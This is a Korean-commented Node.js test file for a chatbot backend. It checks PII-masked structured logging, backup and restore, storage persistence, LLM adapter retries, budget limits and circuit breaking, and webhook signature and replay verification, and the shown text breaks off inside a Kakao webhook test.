/**
 * 런타임 동작 테스트 — TypeScript 소스를 실제로 컴파일해 실행한다.
 * (기존 unit.test.mjs는 소스 텍스트 계약 검사. 이 파일은 "정말 그렇게 동작하는가"를 본다.)
 *
 * 대상: next/react에 의존하지 않는 순수 lib 모듈.
 * typescript 미설치 등 컴파일 불가 환경에서는 전체를 skip 한다(테스트가 거짓 실패하지 않도록).
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import path from 'node:path';
import { pathToFileURL } from 'node:url';
import { compileLibs, importLib, tscPath } from './_compile.mjs';

const CAN_COMPILE = tscPath() !== null;
const opts = CAN_COMPILE ? {} : { skip: 'typescript 미설치 — npm ci 후 실행' };

/** console.log/error 를 가로채 출력된 줄을 모은다. */
function captureConsole(fn) {
  const out = [];
  const err = [];
  const ol = console.log;
  const oe = console.error;
  console.log = (...a) => out.push(a.join(' '));
  console.error = (...a) => err.push(a.join(' '));
  try {
    fn();
  } finally {
    console.log = ol;
    console.error = oe;
  }
  return { out, err };
}

/* ══════════ 구조화 로깅 (정상 경로) ══════════ */

test('요청 로그 1건에 요청ID·소요시간·상태가 담긴다', opts, async () => {
  const { startRequest } = await importLib('logger', ['monitoring']);
  delete process.env.LOG_SILENT;
  process.env.LOG_LEVEL = 'info';

  const { out, err } = captureConsole(() => {
    const rl = startRequest('/api/chat', 'POST', null);
    rl.end({ status: 200, source: 'kb', intent: 'hours' });
  });

  assert.equal(err.length, 0, '2xx는 error로 나가지 않아야 한다');
  assert.equal(out.length, 1, '요청당 정확히 1건이어야 한다');
  const e = JSON.parse(out[0]);
  assert.equal(e.event, 'request');
  assert.equal(e.level, 'info');
  assert.equal(e.route, '/api/chat');
  assert.equal(e.method, 'POST');
  assert.equal(e.status, 200);
  assert.equal(e.source, 'kb');
  assert.equal(typeof e.durationMs, 'number');
  assert.ok(e.durationMs >= 0);
  assert.match(e.requestId, /^[A-Za-z0-9._-]{8,64}$/);
  assert.match(e.ts, /^\d{4}-\d{2}-\d{2}T/);
});

test('상류가 준 요청ID를 이어받는다(분산 추적)', opts, async () => {
  const { startRequest, newRequestId } = await importLib('logger', ['monitoring']);
  assert.equal(startRequest('/api/chat', 'POST', 'abc-123-def-456').requestId, 'abc-123-def-456');
  // 형식이 어긋나면(짧음·공백·제어문자) 서버가 새로 만든다
  assert.notEqual(newRequestId('짧음'), '짧음');
  assert.notEqual(newRequestId('has space here'), 'has space here');
  assert.match(newRequestId(''), /^[A-Za-z0-9._-]{8,64}$/);
  assert.notEqual(newRequestId(null), newRequestId(null), '매번 다른 ID여야 한다');
});

test('세션 해시는 같은 세션에 일관되고 원문을 담지 않는다', opts, async () => {
  const { hashId } = await importLib('logger', ['monitoring']);
  const a = hashId('sess-01012345678');
  assert.equal(a, hashId('sess-01012345678'));
  assert.notEqual(a, hashId('sess-01087654321'));
  assert.equal(a.includes('01012345678'), false, '원문이 그대로 들어가면 안 된다');
  assert.match(a, /^[0-9a-f]{12}$/);
});

test('LOG_LEVEL 아래 레벨은 출력하지 않는다', opts, async () => {
  const { log, shouldLog } = await importLib('logger', ['monitoring']);
  assert.equal(shouldLog('debug', 'info'), false);
  assert.equal(shouldLog('error', 'info'), true);
  delete process.env.LOG_SILENT;
  process.env.LOG_LEVEL = 'warn';
  const { out, err } = captureConsole(() => log('info', 'skipped', { route: '/x' }));
  assert.equal(out.length + err.length, 0);
  process.env.LOG_LEVEL = 'info';
});

/* ══════════ 구조화 로깅 (실패 경로 · 개인정보 보호) ══════════ */

test('허용 목록 밖 필드는 기록되지 않고 이름만 남는다', opts, async () => {
  const { buildEntry } = await importLib('logger', ['monitoring']);
  const e = buildEntry('info', 'request', {
    route: '/api/chat',
    message: '제 번호는 010-1234-5678 입니다',
    contact: 'hong@example.com',
    sessionId: 'sess-raw-value',
    reply: '안녕하세요',
  });
  const json = JSON.stringify(e);
  assert.equal(e.message, undefined);
  assert.equal(e.contact, undefined);
  assert.equal(e.sessionId, undefined);
  assert.equal(/010-1234-5678|hong@example\.com|sess-raw-value|안녕하세요/.test(json), false, '개인정보·본문이 로그에 남았다');
  assert.deepEqual([...e.dropped].sort(), ['contact', 'message', 'reply', 'sessionId']);
});

test('허용 필드에 섞인 개인정보도 마스킹된다', opts, async () => {
  const { buildEntry } = await importLib('logger', ['monitoring']);
  const e = buildEntry('error', 'request', {
    status: 500,
    code: 'internal',
    error: '발송 실패: 010-9876-5432 / a.b@corp.co.kr / 900101-2345678',
  });
  assert.equal(/010-9876-5432|a\.b@corp\.co\.kr|900101-2345678/.test(e.error), false, '마스킹되지 않았다');
  assert.match(e.error, /01\*-\*\*\*\*-\*\*\*\*/);
});

test('객체·배열 값은 통째로 흘리지 않는다', opts, async () => {
  const { buildEntry } = await importLib('logger', ['monitoring']);
  const e = buildEntry('info', 'request', { route: { secret: '010-1111-2222' }, status: 200 });
  assert.equal(typeof e.route, 'undefined');
  assert.ok(e.dropped.includes('route'));
});

test('5xx는 error 레벨로, 4xx는 warn 레벨로 나간다', opts, async () => {
  const { startRequest } = await importLib('logger', ['monitoring']);
  delete process.env.LOG_SILENT;
  process.env.LOG_LEVEL = 'info';
  const r1 = captureConsole(() => startRequest('/api/chat', 'POST').end({ status: 500, code: 'internal' }));
  assert.equal(r1.out.length, 0);
  assert.equal(JSON.parse(r1.err[0]).level, 'error');
  const r2 = captureConsole(() => startRequest('/api/chat', 'POST').end({ status: 429, code: 'rate_limited' }));
  assert.equal(JSON.parse(r2.err[0]).level, 'warn');
  assert.equal(JSON.parse(r2.err[0]).code, 'rate_limited');
});

test('로깅 실패가 요청을 깨뜨리지 않는다', opts, async () => {
  const { log, startRequest } = await importLib('logger', ['monitoring']);
  delete process.env.LOG_SILENT;
  captureConsole(() => {
    assert.doesNotThrow(() => log('info', 'bad', null), 'fields가 null이어도 던지면 안 된다');
    const circular = {};
    circular.self = circular;
    assert.doesNotThrow(() => log('info', 'bad', circular));
    const rl = startRequest('/api/chat', 'POST');
    assert.doesNotThrow(() => rl.end({ status: 200 }));
    assert.doesNotThrow(() => rl.end({ status: 200 }));
  });
});

test('end()를 두 번 불러도 1건만 기록된다', opts, async () => {
  const { startRequest } = await importLib('logger', ['monitoring']);
  delete process.env.LOG_SILENT;
  process.env.LOG_LEVEL = 'info';
  const { out } = captureConsole(() => {
    const rl = startRequest('/api/chat', 'POST');
    rl.end({ status: 200 });
    rl.end({ status: 500 });
  });
  assert.equal(out.length, 1);
  assert.equal(JSON.parse(out[0]).status, 200);
});

/* ══════════ 백업·복구 리허설 (RUNBOOK.md 근거) ══════════ */

test('복구 리허설: 백업 스냅샷으로 관리 콘텐츠가 원상 복구된다', opts, async () => {
  process.env.ADMIN_PERSIST = 'false'; // 테스트가 로컬 파일을 건드리지 않게 한다
  const store = await importLib('adminStore', ['knowledge', 'normalize']);

  // 1) 운영 상태를 만든다
  store.upsertKB({ id: 'drill-1', category: '리허설', question: '복구 훈련용 항목', keywords: ['리허설'], answer: '복구 확인용 답변' });
  store.setRuleOverride('hours', { reply: '리허설 응답' });
  const before = store.exportSnapshot();
  const beforeCount = before.kb.length;
  assert.ok(before.kb.some((e) => e.id === 'drill-1'));
  assert.equal(before.version, 1);

  // 2) 장애를 흉내낸다 — 콘텐츠 유실
  store.importSnapshot({ version: 1, savedAt: new Date().toISOString(), kb: [], ruleOverrides: {}, customRules: [] });
  assert.equal(store.listKB().length, 0, '유실 상태를 만들지 못했다');

  // 3) 백업본으로 복구
  const restored = store.importSnapshot(before);
  assert.equal(restored.ok, true);
  assert.equal(restored.kb, beforeCount);
  assert.equal(store.listKB().length, beforeCount);
  assert.ok(store.listKB().some((e) => e.id === 'drill-1'), '복구 후 항목이 없다');
  assert.equal(store.getRuleOverride('hours')?.reply, '리허설 응답');
});

test('복구 실패 경로: 손상된 스냅샷은 거부하고 기존 데이터를 보존한다', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const store = await importLib('adminStore', ['knowledge', 'normalize']);
  const keep = store.listKB().length;

  for (const bad of [null, 'text', 42, {}, { kb: [], customRules: [] }, { kb: 'x', ruleOverrides: {}, customRules: [] }]) {
    const r = store.importSnapshot(bad);
    assert.equal(r.ok, false, `${JSON.stringify(bad)} 를 통과시키면 안 된다`);
    // 거절 문장은 코드 어휘 대신 다음에 할 일을 말한다(DS 29-3).
    assert.match(r.error, /백업 파일 형식이 아닙니다/);
  }
  assert.equal(store.listKB().length, keep, '거부된 복원이 기존 데이터를 건드리면 안 된다');
});

test('복구 시 무효 항목은 건너뛰고 유효 항목만 반영한다', opts, async () => {
  process.env.ADMIN_PERSIST = 'false';
  const store = await importLib('adminStore', ['knowledge', 'normalize']);
  const r = store.importSnapshot({
    version: 1,
    savedAt: new Date().toISOString(),
    kb: [
      { id: 'good-1', category: '일반', question: '정상 항목', keywords: ['정상'], answer: '정상 답변' },
      { id: '', question: '빈 ID', keywords: ['x'], answer: 'y' },
      { id: 'no-kw', question: '키워드 없음', keywords: [], answer: 'y' },
      null,
    ],
    ruleOverrides: {},
    customRules: [],
  });
  assert.equal(r.ok, true);
  assert.equal(r.kb, 1, '유효 항목 1건만 반영되어야 한다');
  assert.equal(store.listKB().length, 1);
});

/* ══════════ 저장소 어댑터 (영속화) ══════════ */

import { mkdtempSync, writeFileSync, existsSync, readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import nodePath from 'node:path';

/** 테스트용 임시 저장 디렉터리로 storage를 초기화한다. */
async function freshStorage(env = {}) {
  const st = await importLib('storage', ['logger', 'monitoring']);
  const dir = mkdtempSync(nodePath.join(tmpdir(), 'cb-st-'));
  process.env.LOG_SILENT = 'true';
  delete process.env.ADMIN_PERSIST;
  delete process.env.ADMIN_PERSIST_FILE;
  delete process.env.PERSIST_PII;
  process.env.STORAGE_DIR = dir;
  for (const [k, v] of Object.entries(env)) process.env[k] = v;
  st.resetStorageState();
  st.setDriver('file');
  return { st, dir };
}

test('저장소 정상 경로: 파일 드라이버로 저장·복원되고 상태에 남는다', opts, async () => {
  const { st, dir } = await freshStorage();

  const saved = st.saveJson('admin', { version: 1, kb: [{ id: 'a' }] });
  assert.equal(saved.ok, true);
  assert.ok(saved.bytes > 0);
  assert.ok(existsSync(nodePath.join(dir, 'admin.json')), '파일이 만들어지지 않았다');

  const loaded = st.loadJson('admin');
  assert.equal(loaded.ok, true);
  assert.deepEqual(loaded.data.kb, [{ id: 'a' }]);

  const s = st.storageStatus();
  assert.equal(s.driver, 'file');
  const ns = s.namespaces.find((n) => n.ns === 'admin');
  assert.equal(ns.health, 'ok');
  assert.equal(ns.persisted, true);
  assert.equal(ns.lastError, null);
  assert.match(ns.lastSavedAt, /^\d{4}-\d{2}-\d{2}T/);
});

test('저장소 실패 경로: 쓸 수 없는 경로여도 throw하지 않고 오류를 상태에 남긴다', opts, async () => {
  const { st, dir } = await freshStorage();
  // 디렉터리가 되어야 할 자리에 파일을 둔다 → mkdir 시 ENOTDIR
  const blocker = nodePath.join(dir, 'blocked');
  writeFileSync(blocker, 'not a directory', 'utf8');
  process.env.STORAGE_DIR = nodePath.join(blocker, 'sub');

  let threw = false;
  let res;
  try {
    res = st.saveJson('admin', { version: 1 });
  } catch {
    threw = true;
  }
  assert.equal(threw, false, '저장 실패가 애플리케이션으로 새어나가면 안 된다');
  assert.equal(res.ok, false);
  assert.equal(res.reason, 'error');

  const ns = st.storageStatus().namespaces.find((n) => n.ns === 'admin');
  assert.equal(ns.health, 'error', '실패를 조용히 넘기면 안 된다');
  assert.equal(ns.persisted, false);
  assert.ok(ns.lastError && ns.lastError.length > 0, '실패 사유가 기록되어야 한다');
  assert.match(ns.lastErrorAt, /^\d{4}-\d{2}-\d{2}T/);
});

test('읽기전용 파일시스템은 오류가 아니라 readonly 상태로 구분한다', opts, async () => {
  const { st } = await freshStorage();
  st.setDriver({
    name: 'file',
    read: () => null,
    write: () => {
      const e = new Error('EROFS: read-only file system, open /var/task/data/admin.json');
      e.code = 'EROFS';
      throw e;
    },
    remove: () => {},
  });

  const res = st.saveJson('admin', { version: 1 });
  assert.equal(res.ok, false);
  assert.equal(res.reason, 'readonly', 'Vercel 등 읽기전용 환경은 장애 알림 대상이 아니다');
  const ns = st.storageStatus().namespaces.find((n) => n.ns === 'admin');
  assert.equal(ns.health, 'readonly');
  assert.ok(ns.lastError.includes('EROFS'));
  assert.equal(/\/var\/task/.test(ns.lastError), false, '오류 요약에 전체 경로가 남으면 안 된다');
});

test('손상된 저장 파일은 기본값으로 넘어가고 사유를 남긴다', opts, async () => {
  const { st, dir } = await freshStorage();
  writeFileSync(nodePath.join(dir, 'admin.json'), '{ 깨진 JSON', 'utf8');

  const r = st.loadJson('admin');
  assert.equal(r.ok, false);
  assert.equal(r.reason, 'error');
  const ns = st.storageStatus().namespaces.find((n) => n.ns === 'admin');
  assert.equal(ns.health, 'error');
  assert.ok(ns.lastError);
});

test('개인정보 네임스페이스는 승인 전까지 디스크에 쓰지 않는다', opts, async () => {
  const { st, dir } = await freshStorage();

  const blocked = st.saveJson('tickets', { version: 1, tickets: [{ contact: '010-1234-5678' }] });
  assert.equal(blocked.ok, false);
  assert.equal(blocked.reason, 'awaiting_approval');
  assert.equal(existsSync(nodePath.join(dir, 'tickets.json')), false, '승인 전 개인정보가 디스크에 남으면 안 된다');
  assert.equal(st.isPersistEnabled('tickets'), false);
  assert.equal(st.isPersistEnabled('audit'), true, '개인정보가 없는 감사 로그는 저장 대상이다');

  const ns = st.storageStatus().namespaces.find((n) => n.ns === 'tickets');
  assert.equal(ns.health, 'awaiting_approval');

  // 승인 후에는 같은 코드 경로로 저장된다
  process.env.PERSIST_PII = 'true';
  const approved = st.saveJson('tickets', { version: 1, tickets: [] });
  assert.equal(approved.ok, true);
  assert.ok(existsSync(nodePath.join(dir, 'tickets.json')));
  delete process.env.PERSIST_PII;
});

test('ADMIN_PERSIST=false 면 어떤 네임스페이스도 저장하지 않는다', opts, async () => {
  const { st, dir } = await freshStorage({ ADMIN_PERSIST: 'false' });
  const r = st.saveJson('admin', { version: 1 });
  assert.equal(r.ok, false);
  assert.equal(r.reason, 'disabled');
  assert.equal(existsSync(nodePath.join(dir, 'admin.json')), false);
  delete process.env.ADMIN_PERSIST;
});

test('flushSaves는 대기 중인 저장을 버리지 않고 즉시 기록한다', opts, async () => {
  const { st, dir } = await freshStorage();
  st.scheduleSave('admin', () => ({ version: 1, mark: 'flushed' }));
  assert.equal(existsSync(nodePath.join(dir, 'admin.json')), false, '디바운스 전에는 아직 쓰지 않는다');

  st.flushSaves();
  const raw = JSON.parse(readFileSync(nodePath.join(dir, 'admin.json'), 'utf8'));
  assert.equal(raw.mark, 'flushed', '대기 중이던 마지막 변경이 사라지면 안 된다');
});

test('관리 콘텐츠가 저장소를 거쳐 재기동 후에도 복원된다', opts, async () => {
  const { st, dir } = await freshStorage();
  const store = await importLib('adminStore', ['knowledge', 'normalize', 'storage', 'logger', 'monitoring']);

  store.upsertKB({ id: 'persist-1', category: '영속화', question: '저장되나요?', keywords: ['저장'], answer: '네, 저장됩니다.' });
  store.flushAdminPersist();

  const file = nodePath.join(dir, 'admin.json');
  assert.ok(existsSync(file), '관리 콘텐츠가 저장되지 않았다');
  const snap = JSON.parse(readFileSync(file, 'utf8'));
  assert.ok(snap.kb.some((e) => e.id === 'persist-1'));

  // 재기동을 흉내낸다 — 메모리를 비우고 저장분으로 복원
  store.importSnapshot({ version: 1, savedAt: new Date().toISOString(), kb: [], ruleOverrides: {}, customRules: [] }, { persist: false });
  assert.equal(store.listKB().length, 0);
  const loaded = st.loadJson('admin');
  assert.equal(loaded.ok, true);
  store.importSnapshot(loaded.data, { persist: false });
  assert.ok(store.listKB().some((e) => e.id === 'persist-1'), '재기동 복원이 되지 않았다');
});

/* ══════════ LLM 어댑터 ══════════ */

/** 호출 기록을 남기는 가짜 fetch. status/body/throw 를 시나리오로 준다. */
function fakeFetch(steps) {
  const calls = [];
  const queue = [...steps];
  const fn = async (url, init) => {
    calls.push({ url, init, body: init?.body ? JSON.parse(init.body) : null });
    const step = queue.length > 1 ? queue.shift() : queue[0];
    if (step.throws) {
      const e = new Error(step.throws === 'abort' ? 'aborted' : 'boom');
      if (step.throws === 'abort') e.name = 'AbortError';
      throw e;
    }
    return {
      ok: step.status >= 200 && step.status < 300,
      status: step.status,
      json: async () => step.json ?? {},
    };
  };
  fn.calls = calls;
  return fn;
}

function llmCfg(over = {}) {
  return {
    live: true,
    provider: 'anthropic',
    model: 'test-model',
    apiKey: 'sk-test',
    baseUrl: 'https://example.invalid',
    maxInputChars: 6000,
    maxOutputTokens: 200,
    timeoutMs: 500,
    retries: 1,
    maxCallsPerMinute: 60,
    ...over,
  };
}

const noSleep = async () => {};

test('LLM 게이트가 꺼져 있으면 네트워크 호출을 하지 않는다 [승인 필요 기본값]', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 200 }]);
  const r = await llm.complete({ system: 's', messages: [{ role: 'user', content: '안녕' }] }, {
    config: llmCfg({ live: false }),
    fetchImpl: f,
    sleep: noSleep,
  });
  assert.equal(r.ok, false);
  assert.equal(r.reason, 'disabled');
  assert.equal(f.calls.length, 0, '게이트 OFF에서 외부 호출이 나가면 안 된다');
});

test('정상 경로 — 근거 자료로 답변을 생성하고 개인정보는 마스킹해 보낸다', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 200, json: { content: [{ type: 'text', text: '영업시간은 09시~18시입니다.' }] } }]);

  const r = await llm.generateGroundedAnswer(
    {
      question: '제 번호는 010-1234-5678인데 영업시간 알려주세요',
      docs: [{ id: 'kb-1', question: '영업시간', answer: '평일 09시~18시' }],
    },
    { config: llmCfg(), fetchImpl: f, sleep: noSleep },
  );

  assert.equal(r.failed, undefined);
  assert.equal(r.text, '영업시간은 09시~18시입니다.');
  assert.equal(f.calls.length, 1);

  const sent = JSON.stringify(f.calls[0].body);
  assert.equal(sent.includes('010-1234-5678'), false, '전화번호 원문이 외부로 나가면 안 된다');
  assert.match(sent, /01\*-\*\*\*\*-\*\*\*\*/);
  assert.match(f.calls[0].body.system, /자료/, '근거 자료가 시스템 프롬프트에 담겨야 한다');
  assert.equal(f.calls[0].body.max_tokens, 200, '출력 토큰 상한이 적용되어야 한다');
  assert.equal(f.calls[0].init.headers['x-api-key'], 'sk-test');
});

test('실패 경로 — 5xx는 재시도하고, 끝내 실패하면 사유만 남기고 throw 하지 않는다', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 503 }]);
  const r = await llm.complete({ system: 's', messages: [{ role: 'user', content: '질문' }] }, {
    config: llmCfg({ retries: 2 }),
    fetchImpl: f,
    sleep: noSleep,
  });
  assert.equal(r.ok, false);
  assert.equal(r.reason, 'upstream_error');
  assert.equal(r.attempts, 3, 'retries=2 → 총 3회 시도');
  assert.equal(f.calls.length, 3);
});

test('실패 경로 — 4xx는 재시도하지 않는다(무의미한 재호출 금지)', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 400 }]);
  const r = await llm.complete({ system: 's', messages: [{ role: 'user', content: '질문' }] }, {
    config: llmCfg({ retries: 2 }),
    fetchImpl: f,
    sleep: noSleep,
  });
  assert.equal(r.ok, false);
  assert.equal(f.calls.length, 1);
});

test('실패 경로 — 타임아웃/네트워크 오류를 사유로 구분한다', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const t = await llm.complete({ system: 's', messages: [{ role: 'user', content: 'q' }] }, {
    config: llmCfg({ retries: 0 }),
    fetchImpl: fakeFetch([{ throws: 'abort' }]),
    sleep: noSleep,
  });
  assert.equal(t.reason, 'timeout');

  llm.resetLLMState();
  const n = await llm.complete({ system: 's', messages: [{ role: 'user', content: 'q' }] }, {
    config: llmCfg({ retries: 0 }),
    fetchImpl: fakeFetch([{ throws: 'net' }]),
    sleep: noSleep,
  });
  assert.equal(n.reason, 'network');
});

test('키가 없으면 호출 없이 not_configured (시크릿 하드코딩 금지 전제)', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 200 }]);
  const r = await llm.complete({ system: 's', messages: [{ role: 'user', content: 'q' }] }, {
    config: llmCfg({ apiKey: '' }),
    fetchImpl: f,
    sleep: noSleep,
  });
  assert.equal(r.reason, 'not_configured');
  assert.equal(f.calls.length, 0);
});

test('분당 호출 상한을 넘기면 비용이 새기 전에 막는다', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 200, json: { content: [{ type: 'text', text: '답' }] } }]);
  const cfg = llmCfg({ maxCallsPerMinute: 2, retries: 0 });
  const run = () => llm.complete({ system: 's', messages: [{ role: 'user', content: 'q' }] }, { config: cfg, fetchImpl: f, sleep: noSleep });

  assert.equal((await run()).ok, true);
  assert.equal((await run()).ok, true);
  const third = await run();
  assert.equal(third.ok, false);
  assert.equal(third.reason, 'budget_exceeded');
  assert.equal(f.calls.length, 2, '상한 초과분은 호출 자체가 나가지 않아야 한다');
});

test('연속 실패가 쌓이면 서킷을 열어 장애 중인 업스트림을 두들기지 않는다', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  llm.resetLLMState();
  const f = fakeFetch([{ status: 500 }]);
  const cfg = llmCfg({ retries: 0 });
  for (let i = 0; i < llm.CIRCUIT_FAILURE_LIMIT; i += 1) {
    await llm.complete({ system: 's', messages: [{ role: 'user', content: 'q' }] }, { config: cfg, fetchImpl: f, sleep: noSleep });
  }
  const before = f.calls.length;
  const blocked = await llm.complete({ system: 's', messages: [{ role: 'user', content: 'q' }] }, { config: cfg, fetchImpl: f, sleep: noSleep });
  assert.equal(blocked.reason, 'circuit_open');
  assert.equal(f.calls.length, before, '서킷이 열린 동안 추가 호출이 나가면 안 된다');
  assert.equal(llm.llmState().circuitOpen, true);
  llm.resetLLMState();
});

test('입력 상한 — 오래된 턴부터 버리고 마지막 질문은 반드시 남긴다', opts, async () => {
  const llm = await importLib('llm', ['monitoring']);
  const msgs = [
    { role: 'user', content: 'A'.repeat(400) },
    { role: 'assistant', content: 'B'.repeat(400) },
    { role: 'user', content: '마지막 질문' },
  ];
  const c = llm.clampMessages('시스템', msgs, 500);
  assert.ok(c.dropped > 0, '오래된 턴이 버려져야 한다');
  assert.equal(c.messages[c.messages.length - 1].content, '마지막 질문');
  assert.ok(c.chars <= 500);
  assert.ok(llm.estimateTokens('안녕하세요') > llm.estimateTokens('hello'), '한국어 토큰 추정이 더 커야 한다');
});

/* ══════════ 대화 엔진 × LLM 폴백 ══════════ */

// 대화 엔진 모듈들은 **한 번의 컴파일 결과를 공유**해야 상태(KB·세션)가 통한다.
// importLib의 캐시 키는 [이름, ...deps] 이므로, 자기 자신을 뺀 같은 집합을 넘겨 키를 일치시킨다.
const ENGINE = [
  'chat', 'adminStore', 'knowledge', 'rules', 'normalize', 'session',
  'escalation', 'handoff', 'llm', 'monitoring', 'storage', 'logger', 'convlog', 'slots', 'kst',
];
const eng = (name) => importLib(name, ENGINE.filter((n) => n !== name));

/** 확신 매칭은 안 되지만 연관 제안(근거 자료)은 걸리는 질문을 만들어 LLM 경로를 태운다. */
async function seedLLMFixture() {
  process.env.ADMIN_PERSIST = 'false';
  const chat = await eng('chat');
  const store = await eng('adminStore');
  const session = await eng('session');
  const llm = await eng('llm');
  store.upsertKB({
    id: 'rt-llm-kb',
    category: '테스트',
    question: '핀번호 확인 방법',
    keywords: ['zzzzq'],
    answer: '마이페이지 > 내 정보에서 확인하실 수 있습니다.',
  });
  session.resetSessions();
  llm.resetLLMState();
  return { chat, store, session, llm, question: '핀번호' };
}

test('LLM 경로에 진입하려면 근거 자료(연관 FAQ)가 있어야 한다', opts, async () => {
  const { chat, question } = await seedLLMFixture();
  delete process.env.CHAT_LLM_LIVE;
  const base = chat.replyTo(question, 'rt-llm-base');
  assert.equal(base.source, 'fallback');
  assert.equal(base.suggestions?.length > 0, true, '연관 제안이 있어야 LLM에 줄 근거가 생긴다');
});

test('LLM이 실패해도 결정적 폴백 답변이 그대로 나간다(빈 화면 금지)', opts, async () => {
  const { chat, question } = await seedLLMFixture();
  process.env.CHAT_LLM_LIVE = 'true';
  try {
    const r = await chat.replyToAsync(question, 'rt-llm-fail', {
      config: llmCfg({ retries: 0 }),
      fetchImpl: fakeFetch([{ status: 500 }]),
      sleep: noSleep,
    });
    assert.equal(r.source, 'fallback', '실패했는데 생성 답변인 척하면 안 된다');
    assert.equal(r.llmFailure, 'upstream_error', '실패 사유가 로그용으로 남아야 한다');
    assert.ok(r.reply.length > 0, '사용자에게 보여줄 안내가 반드시 있어야 한다');
    assert.equal(r.reply.includes('undefined'), false);
    assert.match(r.reply, /상담원/, '막혔을 때 다음 행동을 제시해야 한다');
  } finally {
    delete process.env.CHAT_LLM_LIVE;
  }
});

test('LLM 성공 시 근거 자료를 넘기고 AI 생성 고지를 붙인다', opts, async () => {
  const { chat, question } = await seedLLMFixture();
  process.env.CHAT_LLM_LIVE = 'true';
  const f = fakeFetch([{ status: 200, json: { content: [{ type: 'text', text: '마이페이지에서 확인하실 수 있어요.' }] } }]);
  try {
    const r = await chat.replyToAsync(question, 'rt-llm-ok', {
      config: llmCfg({ retries: 0 }),
      fetchImpl: f,
      sleep: noSleep,
    });
    assert.equal(r.source, 'llm');
    assert.match(r.reply, /마이페이지에서 확인하실 수 있어요/);
    assert.match(r.reply, /AI가 등록된 자료를 근거로/, 'AI 생성 고지가 빠지면 안 된다');
    assert.equal(f.calls.length, 1);
    assert.match(f.calls[0].body.system, /핀번호 확인 방법/, '근거 자료가 프롬프트에 담겨야 한다');
  } finally {
    delete process.env.CHAT_LLM_LIVE;
  }
});

test('게이트가 꺼져 있으면 replyToAsync는 replyTo와 같은 답을 준다', opts, async () => {
  delete process.env.CHAT_LLM_LIVE;
  const chat = await eng('chat');
  const session = await eng('session');

  session.resetSessions();
  const sync = chat.replyTo('영업시간 알려주세요', 'rt-same-1');
  session.resetSessions();
  const asyncReply = await chat.replyToAsync('영업시간 알려주세요', 'rt-same-2');

  assert.equal(asyncReply.reply, sync.reply);
  assert.equal(asyncReply.source, sync.source);
});

/* ══════════ 웹훅 서명 검증 · 재시도 ══════════ */

test('정상 경로 — 올바른 서명은 통과한다', opts, async () => {
  const wa = await importLib('webhookAuth', []);
  const now = 1_700_000_000_000;
  const ts = String(Math.floor(now / 1000));
  const body = JSON.stringify({ userRequest: { utterance: '영업시간' } });
  const sig = wa.signPayload('secret-1', ts, body);

  assert.deepEqual(wa.verifySignature({ secret: 'secret-1', signature: sig, timestamp: ts, rawBody: body, nowMs: now }), { ok: true });
  assert.deepEqual(wa.verifySignature({ secret: 'secret-1', signature: `v1=${sig}`, timestamp: ts, rawBody: body, nowMs: now }), { ok: true });
});

test('실패 경로 — 본문 변조·시크릿 불일치·리플레이·누락을 각각 거절한다', opts, async () => {
  const wa = await importLib('webhookAuth', []);
  const now = 1_700_000_000_000;
  const ts = String(Math.floor(now / 1000));
  const body = JSON.stringify({ a: 1 });
  const sig = wa.signPayload('secret-1', ts, body);
  const base = { secret: 'secret-1', signature: sig, timestamp: ts, rawBody: body, nowMs: now };

  assert.equal(wa.verifySignature({ ...base, rawBody: JSON.stringify({ a: 2 }) }).reason, 'mismatch');
  assert.equal(wa.verifySignature({ ...base, secret: 'secret-2' }).reason, 'mismatch');
  assert.equal(wa.verifySignature({ ...base, nowMs: now + 10 * 60_000 }).reason, 'expired', '오래된 요청 재전송은 막아야 한다');
  assert.equal(wa.verifySignature({ ...base, signature: '' }).reason, 'missing_signature');
  assert.equal(wa.verifySignature({ ...base, timestamp: '' }).reason, 'missing_timestamp');
  assert.equal(wa.verifySignature({ ...base, timestamp: 'abc' }).reason, 'bad_timestamp');
  assert.equal(wa.verifySignature({ ...base, secret: '' }).reason, 'no_secret');
});

test('서명 비교는 값을 그대로 비교하지 않는다(상수 시간)', opts, async () => {
  const wa = await importLib('webhookAuth', []);
  assert.equal(wa.safeEqual('abc', 'abc'), true);
  assert.equal(wa.safeEqual('abc', 'abd'), false);
  assert.equal(wa.safeEqual('abc', 'abcdefghijk'), false, '길이가 달라도 예외 없이 false여야 한다');
  assert.equal(wa.safeEqual('', ''), true);
});

test('재시도(중복 전달)는 엔진을 다시 돌리지 않고 이전 응답을 돌려준다', opts, async () => {
  const wa = await importLib('webhookAuth', []);
  wa.resetDedupe();
  const now = 1_700_000_000_000;
  const key = wa.eventKey(['evt', 'delivery-1']);

  assert.equal(wa.dedupeCheck(key, { now }).duplicate, false, '첫 전달은 처리해야 한다');
  wa.dedupeRemember(key, { version: '2.0' }, { now });

  const again = wa.dedupeCheck(key, { now: now + 1000 });
  assert.equal(again.duplicate, true);
  assert.deepEqual(again.response, { version: '2.0' });

  // TTL이 지나면 다시 새 이벤트로 본다
  assert.equal(wa.dedupeCheck(key, { now: now + 120_000, ttlMs: 60_000 }).duplicate, false);
  wa.resetDedupe();
});

test('카카오 웹훅 인증 — 시크릿 미설정 시 정책(선택/필수)에 따라 갈린다', opts, async () => {
  const kakao = await importLib('kakao', ['webhookAuth']);
  const body = '{"userRequest":{"utterance":"안녕"}}';
  const h = (o = {}) => new Headers(o);

  assert.equal(kakao.authenticateKakao(h(), body, {}).ok, true, '미설정 + 선택 → 통과(현행 유지)');
  assert.equal(
    kakao.authenticateKakao(h(), body, { KAKAO_SIGNATURE_REQUIRED: 'true' }).reason,
    'no_secret',
    '필수인데 시크릿이 없으면 조용히 열지 말고 차단해야 한다',
  );
